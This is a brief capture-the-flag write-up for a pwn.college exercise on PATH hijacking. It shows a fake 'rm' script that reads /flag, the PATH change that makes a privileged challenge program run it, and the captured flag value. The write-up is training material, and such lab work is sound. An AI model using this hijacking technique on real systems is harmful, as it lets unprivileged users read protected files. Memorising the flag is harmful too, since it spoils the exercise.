# Challenge 5: Hijacking Commands

## Solution

```
hacker@path~hijacking-commands:~$ nano rm
```
```
#!/bin/bash
/run/dojo/bin/cat /flag
```

```
hacker@path~hijacking-commands:~$ chmod a+x rm
hacker@path~hijacking-commands:~$ PATH=~/
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{AmbbgXWH2dTflPvynoyDUKnMvmO.QX3cjM1wiMwAzNzEzW}
```

## Flag
`pwn.college{AmbbgXWH2dTflPvynoyDUKnMvmO.QX3cjM1wiMwAzNzEzW}`
### Notes
-